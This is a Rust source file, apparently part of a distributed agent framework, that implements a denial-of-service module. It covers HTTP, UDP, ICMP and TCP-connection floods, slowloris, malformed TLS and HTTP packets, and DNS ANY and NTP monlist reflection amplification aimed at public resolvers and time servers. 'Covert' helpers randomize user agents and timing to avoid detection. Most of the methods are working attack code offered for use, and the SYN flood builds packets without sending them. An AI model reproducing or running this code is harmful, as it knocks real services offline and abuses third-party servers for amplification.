use std::sync::atomic::{AtomicI64, AtomicU64, Ordering};
use std::sync::Arc;
use libra_common::models::{CampaignStatus, StressConfig, StressAgentStatus};
use tokio::sync::Mutex;
use rand::Rng;

use super::covert_utils::CovertUtils;

/// Thread-safe metrics shared across spawned tasks via Arc.
#[derive(Default)]
struct SharedMetrics {
    packets: AtomicU64,
    bytes: AtomicU64,
    conns: AtomicI64,
}

fn mk_uuid() -> String {
    uuid::Uuid::new_v4().to_string().replace('-', "")
}

pub struct DdosModule {
    campaign_id: Mutex<String>,
    metrics: Arc<SharedMetrics>,
}

impl DdosModule {
    pub fn new() -> Self {
        Self {
            campaign_id: Mutex::new(String::new()),
            metrics: Arc::new(SharedMetrics::default()),
        }
    }

    /// Start a stress campaign. Each method runs in its own tokio task.
    pub async fn start(&self, config: StressConfig) {
        let campaign_id = config.campaign_id.clone();
        *self.campaign_id.lock().await = campaign_id.clone();

        for method_name in &config.methods {
            let metrics = self.metrics.clone();
            let method = method_name.clone();
            let target = config.target_host.clone();
            let port = config.target_port;
            let threads = config.threads_per_agent;
            let packet_size = config.packet_size;
            let max_conns = config.max_connections;
            let http_path = config.http_path.clone();

            tokio::spawn(async move {
                match method.as_str() {
                    "httpFlood" => http_flood(metrics, &target, port, threads, max_conns, packet_size, &http_path).await,
                    "synFlood" => syn_flood(metrics, &target, port, threads, packet_size).await,
                    "udpFlood" => udp_flood(metrics, &target, port, threads, packet_size).await,
                    "icmpFlood" => icmp_flood(metrics, &target, threads, packet_size).await,
                    "slowloris" => slowloris(metrics, &target, port, threads, &http_path).await,
                    "tcpConnFlood" => tcp_conn_flood(metrics, &target, port, threads).await,
                    "reflection" => reflection_amp(metrics, threads).await,
                    "malformed" => malformed_packet(metrics, &target, port, threads, &http_path).await,
                    _ => eprintln!("[DDoS] Unknown method: {}", method),
                }
            });
        }

        if config.duration_seconds > 0 {
            tokio::time::sleep(std::time::Duration::from_secs(config.duration_seconds)).await;
        }
    }

    pub fn build_status(&self, campaign_id: &str, agent_id: &str, _hostname: &str) -> StressAgentStatus {
        let pkt = self.metrics.packets.load(Ordering::Relaxed);
        let bytes = self.metrics.bytes.load(Ordering::Relaxed);
        StressAgentStatus {
            campaign_id: campaign_id.to_string(),
            agent_id: agent_id.to_string(),
            status: CampaignStatus::Running,
            requests_sent: pkt,
            bytes_sent: bytes,
            errors: 0,
            timestamp: std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap_or_default()
                .as_secs(),
        }
    }
}

impl Default for DdosModule {
    fn default() -> Self {
        Self::new()
    }
}

// ════════════════════════════════════════════════════════════════════════
//  HTTP Flood
// ════════════════════════════════════════════════════════════════════════

async fn http_flood(metrics: Arc<SharedMetrics>, target: &str, port: u16, threads: u32, max_conns: usize, packet_size: usize, http_path: &str) {
    let client = reqwest::Client::builder()
        .user_agent(CovertUtils::random_user_agent())
        .pool_max_idle_per_host(max_conns)
        .timeout(std::time::Duration::from_secs(10))
        .build()
        .unwrap();

    let sem = Arc::new(tokio::sync::Semaphore::new(threads as usize));

    loop {
        let permit = sem.clone().acquire_owned().await.unwrap();
        let client = client.clone();
        let target = target.to_string();
        let http_path = http_path.to_string();
        let metrics = metrics.clone();

        tokio::spawn(async move {
            let _permit = permit;
            let is_post = { rand::thread_rng().gen_range(0..10) == 0 };
            let url = format!(
                "http://{}:{}{}?{}",
                target, port, http_path, mk_uuid()
            );

            let bytes: u64;
            let req = if is_post {
                let payload = CovertUtils::random_payload(64, packet_size);
                bytes = payload.len() as u64;
                client.post(&url)
                    .header("User-Agent", CovertUtils::random_user_agent())
                    .header("Accept-Language", CovertUtils::random_accept_language())
                    .header("Cache-Control", "no-cache")
                    .body(payload)
            } else {
                bytes = 0;
                client.get(&url)
                    .header("User-Agent", CovertUtils::random_user_agent())
                    .header("Accept-Language", CovertUtils::random_accept_language())
                    .header("Cache-Control", "no-cache")
            };

            metrics.conns.fetch_add(1, Ordering::Relaxed);
            let _ = req.send().await;
            metrics.conns.fetch_add(-1, Ordering::Relaxed);
            metrics.packets.fetch_add(1, Ordering::Relaxed);
            metrics.bytes.fetch_add(bytes + 1024, Ordering::Relaxed);
        });
    }
}

// ════════════════════════════════════════════════════════════════════════
//  SYN Flood
// ════════════════════════════════════════════════════════════════════════

async fn syn_flood(metrics: Arc<SharedMetrics>, target: &str, port: u16, threads: u32, _packet_size: usize) {
    for _ in 0..threads.min(50) {
        let target = target.to_string();
        let metrics = metrics.clone();
        tokio::spawn(async move {
            loop {
                let packet = build_syn_packet(&target, port);
                metrics.packets.fetch_add(1, Ordering::Relaxed);
                metrics.bytes.fetch_add(packet.len() as u64, Ordering::Relaxed);
                tokio::time::sleep(std::time::Duration::from_millis(
                    CovertUtils::random_jitter(1, 0.5),
                ))
                .await;
            }
        });
    }
}

fn build_syn_packet(_dst_ip: &str, dst_port: u16) -> Vec<u8> {
    let mut rng = rand::thread_rng();
    let src_port = CovertUtils::random_source_port();
    let seq: u32 = rng.gen();
    let win = CovertUtils::random_tcp_window();
    let tcp_len = 20 + rng.gen_range(0..40);
    let mut packet = vec![0u8; tcp_len];
    packet[0] = (src_port >> 8) as u8;
    packet[1] = src_port as u8;
    packet[2] = (dst_port >> 8) as u8;
    packet[3] = dst_port as u8;
    packet[4] = (seq >> 24) as u8;
    packet[5] = (seq >> 16) as u8;
    packet[6] = (seq >> 8) as u8;
    packet[7] = seq as u8;
    packet[13] = 0x02; // SYN
    packet[14] = (win >> 8) as u8;
    packet[15] = win as u8;
    for i in 16..tcp_len {
        packet[i] = rng.gen();
    }
    packet
}

// ════════════════════════════════════════════════════════════════════════
//  UDP Flood
// ════════════════════════════════════════════════════════════════════════

async fn udp_flood(metrics: Arc<SharedMetrics>, target: &str, port: u16, threads: u32, packet_size: usize) {
    for _ in 0..threads.min(100) {
        let target = target.to_string();
        let metrics = metrics.clone();
        tokio::spawn(async move {
            let socket = std::net::UdpSocket::bind("0.0.0.0:0").ok();
            let addr = format!("{}:{}", target, port);
            loop {
                if let Some(ref sock) = socket {
                    let payload = CovertUtils::random_payload(64, packet_size);
                    if let Ok(n) = sock.send_to(&payload, &addr) {
                        metrics.packets.fetch_add(1, Ordering::Relaxed);
                        metrics.bytes.fetch_add(n as u64, Ordering::Relaxed);
                    }
                }
            }
        });
    }
}

// ════════════════════════════════════════════════════════════════════════
//  ICMP Flood
// ════════════════════════════════════════════════════════════════════════

async fn icmp_flood(metrics: Arc<SharedMetrics>, target: &str, threads: u32, packet_size: usize) {
    for _ in 0..threads.min(50) {
        let target = target.to_string();
        let metrics = metrics.clone();
        tokio::spawn(async move {
            loop {
                let payload_size = 32.min(packet_size.min(1472));
                let payload = CovertUtils::random_payload(32, payload_size);
                #[cfg(target_os = "windows")]
                {
                    use std::os::windows::process::CommandExt;
                    let _ = std::process::Command::new("ping")
                        .args(["-n", "1", "-w", "1000", &target])
                        .creation_flags(0x08000000)
                        .stdout(std::process::Stdio::null())
                        .stderr(std::process::Stdio::null())
                        .status();
                }
                #[cfg(not(target_os = "windows"))]
                {
                    let _ = std::process::Command::new("ping")
                        .args(["-c", "1", "-W", "1", &target])
                        .stdout(std::process::Stdio::null())
                        .stderr(std::process::Stdio::null())
                        .status();
                }
                metrics.packets.fetch_add(1, Ordering::Relaxed);
                metrics.bytes.fetch_add(payload.len() as u64, Ordering::Relaxed);
            }
        });
    }
}

// ════════════════════════════════════════════════════════════════════════
//  Slowloris
// ════════════════════════════════════════════════════════════════════════

async fn slowloris(metrics: Arc<SharedMetrics>, target: &str, port: u16, threads: u32, http_path: &str) {
    let max_conns = threads.min(500);
    for _ in 0..max_conns {
        let target = target.to_string();
        let http_path = http_path.to_string();
        let metrics = metrics.clone();
        tokio::spawn(async move {
            loop {
                let stream = tokio::net::TcpStream::connect(format!("{}:{}", target, port)).await;
                if let Ok(mut stream) = stream {
                    use tokio::io::AsyncWriteExt;
                    metrics.conns.fetch_add(1, Ordering::Relaxed);

                    let partial = format!(
                        "GET {} HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nAccept: text/html,application/xhtml+xml,*/*\r\nAccept-Language: {}\r\nConnection: keep-alive\r\n",
                        http_path, target,
                        CovertUtils::random_user_agent(),
                        CovertUtils::random_accept_language(),
                    );
                    let hdr = partial.into_bytes();
                    let _ = stream.write_all(&hdr).await;
                    metrics.packets.fetch_add(1, Ordering::Relaxed);
                    metrics.bytes.fetch_add(hdr.len() as u64, Ordering::Relaxed);

                    loop {
                        tokio::time::sleep(std::time::Duration::from_millis(
                            CovertUtils::random_jitter(5000, 0.5),
                        ))
                        .await;
                        let drip = format!(
                            "X-Random-{}: {}\r\n",
                            mk_uuid(), mk_uuid()
                        );
                        let bytes = drip.into_bytes();
                        if stream.write_all(&bytes).await.is_err() {
                            break;
                        }
                        metrics.bytes.fetch_add(bytes.len() as u64, Ordering::Relaxed);
                    }
                }
                metrics.conns.fetch_add(-1, Ordering::Relaxed);
            }
        });
    }
}

// ════════════════════════════════════════════════════════════════════════
//  TCP Connection Flood
// ════════════════════════════════════════════════════════════════════════

async fn tcp_conn_flood(metrics: Arc<SharedMetrics>, target: &str, port: u16, threads: u32) {
    let max_conns = threads.min(1000);
    let sem = Arc::new(tokio::sync::Semaphore::new(max_conns as usize));

    loop {
        let permit = sem.clone().acquire_owned().await.unwrap();
        let target = target.to_string();
        let metrics = metrics.clone();

        tokio::spawn(async move {
            let _permit = permit;
            let stream = tokio::net::TcpStream::connect(format!("{}:{}", target, port)).await;
            if let Ok(_stream) = stream {
                metrics.conns.fetch_add(1, Ordering::Relaxed);
                metrics.packets.fetch_add(1, Ordering::Relaxed);
                loop {
                    tokio::time::sleep(std::time::Duration::from_millis(
                        CovertUtils::random_jitter(30000, 0.2),
                    ))
                    .await;
                }
            }
        });
    }
}

// ════════════════════════════════════════════════════════════════════════
//  Reflection Amplification (DNS/NTP)
// ════════════════════════════════════════════════════════════════════════

const DNS_RESOLVERS: &[&str] = &[
    "8.8.8.8", "8.8.4.4", "1.1.1.1", "9.9.9.9",
    "208.67.222.222", "208.67.220.220", "4.2.2.4",
];

const NTP_SERVERS: &[&str] = &[
    "time.google.com", "pool.ntp.org", "time.windows.com",
    "time.nist.gov", "ntp.aliyun.com",
];

async fn reflection_amp(metrics: Arc<SharedMetrics>, threads: u32) {
    for i in 0..threads.min(50) {
        let metrics = metrics.clone();
        tokio::spawn(async move {
            let socket = std::net::UdpSocket::bind("0.0.0.0:0").ok();
            loop {
                if let Some(ref sock) = socket {
                    let mut rng = rand::thread_rng();
                    if i % 2 == 0 {
                        let q = build_dns_any();
                        let resolver = DNS_RESOLVERS[rng.gen_range(0..DNS_RESOLVERS.len())];
                        let _ = sock.send_to(&q, format!("{}:53", resolver));
                        metrics.packets.fetch_add(1, Ordering::Relaxed);
                        metrics.bytes.fetch_add((q.len() + 512) as u64, Ordering::Relaxed);
                    } else {
                        let server = NTP_SERVERS[rng.gen_range(0..NTP_SERVERS.len())];
                        let payload = build_ntp_monlist();
                        let _ = sock.send_to(&payload, format!("{}:123", server));
                        metrics.packets.fetch_add(1, Ordering::Relaxed);
                        metrics.bytes.fetch_add(48 + 482, Ordering::Relaxed);
                    }
                }
                tokio::time::sleep(std::time::Duration::from_millis(
                    if i % 2 == 0 {
                        CovertUtils::random_jitter(50, 0.5)
                    } else {
                        CovertUtils::random_jitter(100, 0.5)
                    },
                ))
                .await;
            }
        });
    }
}

fn build_dns_any() -> Vec<u8> {
    let domain = format!("{}.com", &mk_uuid()[..8]);
    let mut buf = vec![0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00];
    for part in domain.split('.') {
        if part.is_empty() { continue; }
        buf.push(part.len() as u8);
        buf.extend_from_slice(part.as_bytes());
    }
    buf.push(0);
    buf.extend_from_slice(&[0x00, 0xFF, 0x00, 0x01]);
    buf
}

fn build_ntp_monlist() -> Vec<u8> {
    vec![
        0x16, 0x02, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    ]
}

// ════════════════════════════════════════════════════════════════════════
//  Malformed Protocol Packets
// ════════════════════════════════════════════════════════════════════════

async fn malformed_packet(metrics: Arc<SharedMetrics>, target: &str, port: u16, threads: u32, http_path: &str) {
    for i in 0..threads.min(50) {
        let target = target.to_string();
        let http_path = http_path.to_string();
        let metrics = metrics.clone();
        tokio::spawn(async move {
            use tokio::io::AsyncWriteExt;
            loop {
                match i % 3 {
                    0 => {
                        if let Ok(mut stream) = tokio::net::TcpStream::connect(format!("{}:{}", target, port)).await {
                            let tls = build_malformed_tls();
                            let _ = stream.write_all(&tls).await;
                            metrics.packets.fetch_add(1, Ordering::Relaxed);
                            metrics.bytes.fetch_add(tls.len() as u64, Ordering::Relaxed);
                        }
                    }
                    1 => {
                        if let Ok(mut stream) = tokio::net::TcpStream::connect(format!("{}:{}", target, port)).await {
                            let data = format!(
                                "GET {} HTTP/1.1\r\nHost: {}\r\nX-Oversized: {}\r\nTransfer-Encoding: chunked, identity, gzip\r\nContent-Length: -1\r\n\r\n",
                                http_path, target, "X".repeat(8192),
                            );
                            let bytes = data.into_bytes();
                            let _ = stream.write_all(&bytes).await;
                            metrics.packets.fetch_add(1, Ordering::Relaxed);
                            metrics.bytes.fetch_add(bytes.len() as u64, Ordering::Relaxed);
                        }
                    }
                    _ => {
                        if let Ok(mut stream) = tokio::net::TcpStream::connect(format!("{}:{}", target, port)).await {
                            let garbage = CovertUtils::random_payload(256, 4096);
                            let _ = stream.write_all(&garbage).await;
                            metrics.packets.fetch_add(1, Ordering::Relaxed);
                            metrics.bytes.fetch_add(garbage.len() as u64, Ordering::Relaxed);
                        }
                    }
                }
            }
        });
    }
}

fn build_malformed_tls() -> Vec<u8> {
    let mut rng = rand::thread_rng();
    let len = 256 + rng.gen_range(0..512);
    let mut buf = vec![0u8; len];
    buf[0] = 0x16;
    buf[1] = 0x03;
    buf[2] = rng.gen_range(1..4);
    buf[3] = ((len - 5) >> 8) as u8;
    buf[4] = (len - 5) as u8;
    buf[5] = 0x01;
    for i in 6..len {
        buf[i] = rng.gen();
    }
    buf
}
